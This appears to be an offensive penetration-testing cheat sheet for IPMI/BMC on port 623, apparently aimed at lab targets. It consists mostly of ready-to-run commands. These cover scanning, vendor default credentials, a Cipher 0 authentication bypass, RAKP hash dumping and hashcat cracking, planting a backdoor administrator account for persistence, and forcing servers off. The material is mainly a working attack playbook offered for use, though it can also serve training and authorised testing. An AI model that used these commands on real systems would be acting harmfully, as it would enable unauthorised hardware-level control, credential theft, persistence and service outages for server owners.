# IPMI (Intelligent Platform Management Interface)
**Default Port:** 623 (UDP) 
**Key Insight:** IPMI allows remote management of the hardware (BMC). If you compromise this, you effectively have physical access to the server (Power, BIOS, Console).
## 1. Discovery & Version Detection
**Goal:** Identify if IPMI is listening. **Must use UDP scanning**.
### Nmap
**Syntax:** `sudo nmap -sU -p 623 <IP>`
```shell
# Version Detection script
# ⚠️ OPSEC: Moderate Noise (UDP).
sudo nmap -sU -p 623 --script ipmi-version 10.129.2.15
```
### Metasploit (Version Scanner)
```shell
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS 10.129.2.15
run
```
## 2. Default Credentials
**Goal:** Try standard manufacturer defaults before attempting exploits.

| **Product**    | **Username**    | **Password**                                    |
| -------------- | --------------- | ----------------------------------------------- |
| *Dell iDRAC* | `root`          | `calvin`                                        |
| *HP iLO*     | `Administrator` | Random 8-char string (often printed on sticker) |
| *Supermicro* | `ADMIN`         | `ADMIN`                                         |
| *Generic*    | `admin`         | `admin`                                         |
| *Generic*    | `root`          | `root`                                          |
## 3. Vulnerability: Cipher 0 (Auth Bypass)
**Description:** A configuration flaw where the server accepts "Cipher Suite 0", which allows authentication **without a password**. 
**Impact:** Full administrative access.
### Metasploit Check
```shell
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS 10.129.2.15
run
```
### Manual Check (ipmitool)
**Install:** `sudo apt install ipmitool` 
**Syntax:** `ipmitool -I lanplus -C 0 -H <IP> -U <User> -P "" <Command>`
```shell
# List users with empty password (-P "") and Cipher 0 (-C 0)
ipmitool -I lanplus -C 0 -H 10.129.2.15 -U admin -P "" user list
```
## 4. Vulnerability: Hash Dumping (RAKP)
**Description:** The IPMI 2.0 RAKP protocol allows you to request the HMAC-SHA1 hash of a user **before** authenticating. This is similar to Kerberoasting (offline cracking).
### Dump Hashes (Metasploit)
**Module:** `auxiliary/scanner/ipmi/ipmi_dumphashes`
```shell
# Dumps hashes for default users (admin, root, etc.)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.129.2.15
set OUTPUT_FILE ipmi_hashes.txt
run
```
### Crack Hashes (Hashcat)
**Mode:** 7300 (IPMI 2.0 RAKP-HMAC-SHA1)
```shell
# Standard Dictionary Attack
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# HP iLO Mask Attack (If standard fails)
# HP defaults are 8 characters, UpperAlpha + Digits.
hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
## 5. Manual Interaction (ipmitool)
**Context:** You have valid credentials (dumped or default). 
**Syntax:** `ipmitool -I lanplus -H <IP> -U <User> -P <Pass> <Command>`
### Enumeration & Status
```shell
# Check Chassis Status (Power state, Drive faults)
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password chassis status

# List Users (Find other accounts)
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password user list
```
### Persistence (Backdoor User)
**Goal:** Create a new admin user for persistence.
```shell
# 1. Set Name 'hacker' on Slot 2
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password user set name 2 hacker

# 2. Set Password
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password user set password 2 Password123!

# 3. Enable User
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password user enable 2

# 4. Grant Admin Privileges (Level 4)
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password channel setaccess 1 2 callin=on ipmi=on link=on privilege=4
```
### Power Control (Dangerous)
**Goal:** Force a reboot or shutdown (DoS or to boot from malicious ISO).
```shell
# Force Shutdown
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password chassis power off

# Force Power On
ipmitool -I lanplus -H 10.129.2.15 -U admin -P password chassis power on
```